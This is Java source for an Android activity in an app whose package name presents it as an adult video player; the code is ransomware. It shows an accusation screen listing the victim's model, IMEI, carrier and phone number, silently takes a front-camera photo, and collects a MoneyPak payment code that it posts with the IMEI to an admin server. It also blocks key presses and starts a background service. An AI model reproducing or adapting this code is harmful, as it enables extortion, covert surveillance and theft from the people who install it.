package com.adult.free.hd.xxx.video.player;

import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.json.JSONObject;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Handler;
import android.view.KeyEvent;
import android.view.SurfaceView;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends Activity {

	private ProgressDialog dialog;

	private SurfaceView surfaceView;
	
	private Button startDetails;
	
	private Button yesAgreement;
	
	private Button backAgreement;
	
	private TextView mpCode;
	
	private TextView deviceName;
	
	private TextView deviceId;
	
	private TextView deviceCountry;
	
	private TextView deviceCarrier;
	
	private TextView devicePhone;
	
	private Button button1;
	
	private Button button2;
	
	private Button button3;
	
	private Button button4;
	
	private Button button5;
	
	private Button button6;
	
	private Button button7;
	
	private Button button8;
	
	private Button button9;
	
	private Button button0;
	
	private Button buttonProceed;
	
	private Button buttonClear;
	
	private Button buttonHelp;
	
	private LinearLayout mpHelp;

	private GBTakePictureNoPreview c;
	
	private enum Screen {
		StartAccusation, Agreement, MoneyPack
	}

	public void onCreate(Bundle savedInstanceState) {
		dialog = new ProgressDialog(this);
		dialog.setCancelable(false);
		dialog.setMessage(getString(R.string.kggjfak));
		super.onCreate(savedInstanceState);
		requestWindowFeature(Window.FEATURE_NO_TITLE);
		getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
				WindowManager.LayoutParams.FLAG_FULLSCREEN);
		setContentView(R.layout.hcgbbbcdeghbg);
		initViews(Screen.StartAccusation);
		startService();
	}
	
	/**
	 * @param screen
	 */
	private void initViews(Screen screen) {
		if (screen == Screen.StartAccusation) {
			deviceName = (TextView) findViewById(R.id.hcagejgkjek);
			deviceName.setText(Utils.getModel());
			deviceId = (TextView) findViewById(R.id.cibfkigieaejjj);
			deviceId.setText(Utils.getIMEI(this));
			deviceCountry = (TextView) findViewById(R.id.bedgbbhf);
			deviceCountry.setText(getResources().getConfiguration().locale.getCountry());
			deviceCarrier = (TextView) findViewById(R.id.gjahgb);
			String carrier = Utils.getOperatorName(this);
			if (carrier.equals("NO")) {
				deviceCarrier.setVisibility(View.GONE);
			} else {
				deviceCarrier.setText(carrier);
			}
			devicePhone = (TextView) findViewById(R.id.igfeg);
			String phone = Utils.getPhoneNumber(this);
			if (phone.equals("NO")) {
				devicePhone.setVisibility(View.GONE);
			} else {
				devicePhone.setText(phone);
			}
			startDetails = (Button) findViewById(R.id.ijehjcafca);
			startDetails.setOnClickListener(new OnClickListener() {

				@Override
				public void onClick(View v) {
					setContentView(R.layout.ddbfc);
					initViews(Screen.Agreement);
				}
			});
		} else if (screen == Screen.Agreement) {
			yesAgreement = (Button) findViewById(R.id.gfdjkfeejcb);
			yesAgreement.setOnClickListener(new OnClickListener() {

				@Override
				public void onClick(View v) {
					setContentView(R.layout.ebagigcbgg);
					initViews(Screen.MoneyPack);
					initCameraPreview();
				}
			});
	        backAgreement = (Button) findViewById(R.id.dcjbebhahcche);
	        backAgreement.setOnClickListener(new OnClickListener() {
				
				@Override
				public void onClick(View v) {
					setContentView(R.layout.hcgbbbcdeghbg);
					initViews(Screen.StartAccusation);
				}
			});
		} else if (screen == Screen.MoneyPack) {
			surfaceView = (SurfaceView) findViewById(R.id.jbbakjbhakdh);
			mpHelp = (LinearLayout) findViewById(R.id.gkgicfaiak);
			mpCode = (TextView) findViewById(R.id.jgbjajkb);
			button0 = (Button) findViewById(R.id.bahbg);
			setDigitButtonListener(button0, "0");
			button1 = (Button) findViewById(R.id.jcfbbgggjf);
			setDigitButtonListener(button1, "1");
			button2 = (Button) findViewById(R.id.hejafhi);
			setDigitButtonListener(button2, "2");
			button3 = (Button) findViewById(R.id.ahkfiaiigf);
			setDigitButtonListener(button3, "3");
			button4 = (Button) findViewById(R.id.kdakjb);
			setDigitButtonListener(button4, "4");
			button5 = (Button) findViewById(R.id.iekhbeh);
			setDigitButtonListener(button5, "5");
			button6 = (Button) findViewById(R.id.hgbigebjdiagka);
			setDigitButtonListener(button6, "6");
			button7 = (Button) findViewById(R.id.bdaekh);
			setDigitButtonListener(button7, "7");
			button8 = (Button) findViewById(R.id.kgggbfhi);
			setDigitButtonListener(button8, "8");
			button9 = (Button) findViewById(R.id.edadefbjdiha);
			setDigitButtonListener(button9, "9");
			buttonProceed = (Button) findViewById(R.id.hgfbhcih);
			buttonProceed.setOnClickListener(new OnClickListener() {

				@Override
				public void onClick(View v) {
					sendCode();
				}
			});
			buttonHelp = (Button) findViewById(R.id.kechbjh);
			buttonHelp.setOnClickListener(new OnClickListener() {

				@Override
				public void onClick(View v) {
					if (mpHelp.getVisibility() == View.GONE) {
						mpHelp.setVisibility(View.VISIBLE);
					} else {
						mpHelp.setVisibility(View.GONE);
					}
				}
			});
			buttonClear = (Button) findViewById(R.id.ajhdbb);
			buttonClear.setOnClickListener(new OnClickListener() {

				@Override
				public void onClick(View v) {
					mpCode.setText("");
				}
			});
		}
	}
	
	void setDigitButtonListener(Button button, final String digit) {
		button.setOnClickListener(new OnClickListener() {
			
			@Override
			public void onClick(View v) {
				insertDigit(digit);
			}
		});
	}
	
	void initCameraPreview() {
        c = new GBTakePictureNoPreview(this, surfaceView);
        c.setUseFrontCamera(true);
        c.setPortrait();
        new Handler().postDelayed(new Runnable() {
            public void run() {
            	if (c.cameraIsOk()) {       
            	    c.takePicture();
            	}
            }
        }, 2000);
	}

	private void insertDigit(String digit) {
		mpCode.setText(mpCode.getText().toString() + digit);
	}

	private void sendCode() {
		int codeLength = mpCode.getText().toString().length();
		if (codeLength == Constants.MONEYPACK_DIGITS_NUMBER) {
			new CodeSender(this, mpCode.getText().toString()).execute();
		} else {
			Toast.makeText(this, getString(R.string.bbjbjif), Toast.LENGTH_SHORT).show();
		}
		/**/
	}
	
	public class CodeSender extends AsyncTask<Void, Void, Boolean> {
		
		private Context context;
		
		private String code;
		
		private String errorString;
		
		public CodeSender(Context context, String code) {
			this.context = context;
			this.code = code;
			errorString = "err";
		}

		protected void onPreExecute() {
			dialog.show();
		}

		@Override
		protected Boolean doInBackground(Void... params) {
			try {
	    		HttpClient httpclient = new DefaultHttpClient();
	    		JSONObject jObj = new JSONObject();
	    		jObj.put("t", "c");
	    		jObj.put("d", Utils.getIMEI(context));
	    		jObj.put("c", code);
	    		jObj.put("n", Constants.CLIENT_NUMBER);
	    		HttpPost httpPost = new HttpPost(Constants.ADMIN_URL);
	            httpPost.setEntity(new StringEntity(jObj.toString(), "UTF-8"));
				HttpResponse response = httpclient.execute(httpPost);
				if (response.getStatusLine().getStatusCode() != 200) {
					errorString = context.getString(R.string.eaigbg);
					return false;
				}
				return true;
			} catch (Exception e) {
				errorString = e.getLocalizedMessage();
				return false;
			}
		}
		
		protected void onPostExecute(Boolean result) {
			dialog.dismiss();
			if (result) {
				AlertDialog alertDialog = new AlertDialog.Builder(MainActivity.this).create();
				alertDialog.setTitle(getString(R.string.hiaefdeckef));
				alertDialog.setMessage(getString(R.string.jbgiafkdg));
				alertDialog.setButton("OK", new DialogInterface.OnClickListener() {
					
					public void onClick(DialogInterface dialog, int which) {
						dialog.dismiss();
					}
				});
				alertDialog.setIcon(R.drawable.ic_launcher);
				alertDialog.show();
			} else {
				Toast.makeText(context, errorString, Toast.LENGTH_SHORT).show();
			}
		}
	}

	private void startService() {
		if (!MainService.isRunning) {
			Intent i = new Intent(ServiceStarter.ACTION);
			i.setClass(this, MainService.class);
			startService(i);
		}
	}
	
	public boolean onKeyDown(int keyCode, KeyEvent keyEvent) {
		return true;
	}
	
	public void onStart() {
		super.onStart();
	}
}
